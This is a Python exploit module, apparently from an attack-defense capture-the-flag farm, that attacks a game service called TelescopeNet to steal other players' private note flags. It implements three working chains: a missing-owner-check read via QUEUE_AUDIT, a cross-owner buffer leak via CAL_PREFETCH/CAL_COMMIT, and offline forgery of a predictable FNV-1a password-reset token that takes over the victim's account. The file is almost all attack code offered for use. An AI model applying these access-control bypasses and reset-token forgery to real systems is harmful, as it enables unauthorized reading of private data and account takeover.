#!/usr/bin/env python3
"""telescope (7419/tcp) - farm module.

Three independent chains against TelescopeNet's note store. Notes are the flag
store: STORE_NOTE always writes private=1 and GET_NOTE/LIST_NOTES filter on
owner, so every chain here is about reaching another owner's note body.

  A  QUEUE_AUDIT <victim> -> JOB_RESULT      pristine: no owner predicate, the
                                             victim's latest note body is baked
                                             into jobs.result verbatim.
  B  CAL_OPEN/CAL_PREFETCH <victim>/CAL_COMMIT
                                             pristine: CAL_COMMIT echoes the
                                             prefetched memo back regardless of
                                             who owns the buffer.
  C  RESET_FINISH token forgery -> login as the victim
                                             the reset token is fnv1a over four
                                             PUBLIC inputs, so it computes
                                             offline. Reaches boxes that fixed
                                             A and B but left the token keyed on
                                             public data only.

A and B die the moment a target adds an owner check. C outlives them, and once
logged in as the victim a *self* QUEUE_AUDIT is a legitimate flow, so it keeps
working on an otherwise well-patched box.

Chain C changes the victim's password. On a pristine box that is invisible --
password_acceptable() also accepts every hash in users.old and RESET_FINISH
pushes the old hash there, so the victim's checker keeps logging in. On a box
that dropped users.old but did NOT re-key the token, it will lock that
checker out until the next flag planting. It therefore runs ONLY after A and B
have both come up empty, i.e. only where nothing else works. Set
TELE_NO_TAKEOVER=1 to drop it entirely.
"""

from __future__ import annotations

import os
import re
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from _common import (  # noqa: E402
    DEFAULT_TIMEOUT,
    Conn,
    GAME_FLAG_RE,
    dedup,
    main,
    rand_name,
    rand_pass,
    run_vectors,
    safe,
)

NAME = "telescope"
PORT = 7419

# --------------------------------------------------------------------- caps
# Nothing here fans out and nothing runs concurrently. One dead target costs a
# connect timeout per chain.

#: LIST_NOTES titles to pull after a takeover. The current tick's flag is the
#: newest note and QUEUE_AUDIT already returns it, so this is only for flags
#: from earlier ticks that are still inside their 5-tick life.
MAX_TITLES = 25

#: RESET_FINISH attempts. The server accepts its own bucket and bucket-1, and
#: we cross that with two candidate stable_home values -> 4 at most.
MAX_TOKEN_TRIES = 4

FNV_OFFSET = 1469598103934665603
FNV_PRIME = 1099511628211
MASK64 = (1 << 64) - 1

#: BANNER prints this, so it is read off the target rather than hardcoded. Only
#: used if BANNER cannot be parsed.
DEFAULT_SEED = 0x6D3A4F19

#: home.substr(0, home.find(" ")) of the stock "Mesquite Ridge".
DEFAULT_STABLE_HOME = "Mesquite"


def fnv1a(data: bytes) -> int:
    h = FNV_OFFSET
    for byte in data:
        h = ((h ^ byte) * FNV_PRIME) & MASK64
    return h


def hex64(value: int) -> str:
    return format(value, "016x")


def reset_token(user: str, stable_home: str, bucket: str, seed: int) -> str:
    """The RESET_FINISH token: fnv1a(user:stable_home:bucket:seed) truncated to 10.

    Every input is public. `seed` is printed by BANNER, `bucket` is returned by
    RESET_PREP, and `stable_home` is the home column up to its first space,
    which the stock service hardcodes to "Mesquite Ridge" -- so "Mesquite" for
    every account on every box.
    """
    blob = f"{user}:{stable_home}:{bucket}:{seed}".encode()
    return hex64(fnv1a(blob))[:10]


class Client:
    """One connection. Every command is a line and every reply is a line."""

    def __init__(self, host: str, port: int, timeout: float) -> None:
        self.conn = Conn(host, port, timeout)
        self.conn.recv_line()  # "OK TelescopeNet/1.0"
        self.seen: list[str] = []

    def __enter__(self) -> "Client":
        return self

    def __exit__(self, *exc) -> None:
        self.conn.close()

    def cmd(self, line: str) -> str:
        self.conn.sendline(line)
        reply = self.conn.recv_line().decode("utf-8", "replace").strip()
        self.seen.append(reply)
        return reply

    def seed(self) -> int:
        match = re.search(r"seed=(\d+)", self.cmd("BANNER"))
        return int(match.group(1)) if match else DEFAULT_SEED

    def register_login(self) -> str:
        """A throwaway account. Returns its username."""
        user, password = rand_name("obs"), rand_pass()
        self.cmd(f"REGISTER {user} {password}")
        if not self.cmd(f"LOGIN {user} {password}").startswith("OK"):
            raise RuntimeError("could not log in as a fresh account")
        return user


def harvest(seen: list[str]) -> list[str]:
    """Keep only replies carrying a flag.

    Every reply the chains collect is a protocol line, and _common.main() falls
    back to printing a secret verbatim when no flag is embedded in it. stdout is
    auto-submitted, so returning raw chatter would submit "OK registered" and
    friends as flag guesses. Filter here instead.
    """
    return dedup(line for line in seen if GAME_FLAG_RE.search(line))


def targets() -> list[str]:
    """Victim usernames. telescope's flagid IS the note owner."""
    out = [t.strip() for t in os.environ.get("FARM_FLAGID", "").split(",")]
    return dedup(t for t in out if t)


# ------------------------------------------------------------------ chain A
@safe
def vector_queue_audit(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str]:
    """QUEUE_AUDIT embeds the target's latest note body in jobs.result."""
    victims = targets()
    if not victims:
        return []
    with Client(host, port, timeout) as client:
        client.register_login()
        for victim in victims:
            reply = client.cmd(f"QUEUE_AUDIT {victim}")
            job = reply.split()[-1] if reply.startswith("OK job") else ""
            if job:
                client.cmd(f"JOB_RESULT {job}")
        return harvest(client.seen)


# ------------------------------------------------------------------ chain B
@safe
def vector_cal_prefetch(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str]:
    """CAL_COMMIT echoes a buffer prefetched from another owner."""
    victims = targets()
    if not victims:
        return []
    with Client(host, port, timeout) as client:
        client.register_login()
        for victim in victims:
            client.cmd("CAL_OPEN cal")
            client.cmd(f"CAL_PREFETCH {victim}")
            client.cmd("CAL_COMMIT")
        return harvest(client.seen)


# ------------------------------------------------------------------ chain C
def _drain_as_owner(client: Client, victim: str) -> None:
    """Already authenticated as `victim`: pull every note the account holds.

    A self QUEUE_AUDIT is a legitimate flow even on a patched box, and it hands
    back the newest note body without needing to know its title -- which also
    dodges GET_NOTE's inability to express a title containing a space.
    """
    reply = client.cmd(f"QUEUE_AUDIT {victim}")
    if reply.startswith("OK job"):
        client.cmd(f"JOB_RESULT {reply.split()[-1]}")

    listing = client.cmd("LIST_NOTES")
    titles = []
    for entry in listing.split("|")[1:]:
        title = entry.rsplit(",", 1)[0].strip()
        # GET_NOTE takes a whitespace-delimited arg, so a title with a space is
        # unaddressable; QUEUE_AUDIT above already covered the newest note.
        if title and not re.search(r"\s", title):
            titles.append(title)
    for title in dedup(titles)[:MAX_TITLES]:
        client.cmd(f"GET_NOTE {title}")

    client.cmd("LIST_SCOPES")


@safe
def vector_reset_takeover(host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> list[str]:
    """Forge the reset token offline, then read the notes as the owner."""
    if os.environ.get("TELE_NO_TAKEOVER"):
        return []
    victims = targets()
    if not victims:
        return []

    found: list[str] = []
    for victim in victims:
        with Client(host, port, timeout) as client:
            seed = client.seed()

            # RESET_PREP confirms the account exists and, more usefully, hands
            # back the server's OWN bucket -- no clock-skew guessing -- plus the
            # home column it held before the call.
            prep = client.cmd(f"RESET_PREP {victim}")
            if not prep.startswith("OK prep"):
                found.extend(harvest(client.seen))
                continue
            fields = prep.split()
            bucket = fields[-1]
            prior_home = " ".join(fields[2:-1])

            # The UPDATE inside RESET_PREP rewrites home to "Mesquite Ridge
            # <hex>", so stable_home is "Mesquite" from here on; keep the
            # pre-call value as a fallback for a box that changed the literal.
            homes = dedup([DEFAULT_STABLE_HOME, prior_home.split(" ")[0]])
            buckets = [bucket, str(int(bucket) - 1)] if bucket.isdigit() else [bucket]

            password = rand_pass()
            tries = 0
            owned = False
            for stable_home in homes:
                for candidate in buckets:
                    if tries >= MAX_TOKEN_TRIES:
                        break
                    tries += 1
                    token = reset_token(victim, stable_home, candidate, seed)
                    if client.cmd(f"RESET_FINISH {victim} {token} {password}").startswith("OK"):
                        owned = True
                        break
                if owned:
                    break

            if owned and client.cmd(f"LOGIN {victim} {password}").startswith("OK"):
                _drain_as_owner(client, victim)
            found.extend(harvest(client.seen))
    return found


VECTORS = [
    vector_queue_audit,
    vector_cal_prefetch,
    vector_reset_takeover,
]


def run(host: str, port: int = PORT) -> list[str]:
    # stop_on_first keeps the takeover from firing against a target that A or B
    # already gave up its notes for free.
    return run_vectors(VECTORS, host, port, stop_on_first=True)


if __name__ == "__main__":
    raise SystemExit(main(run, PORT))
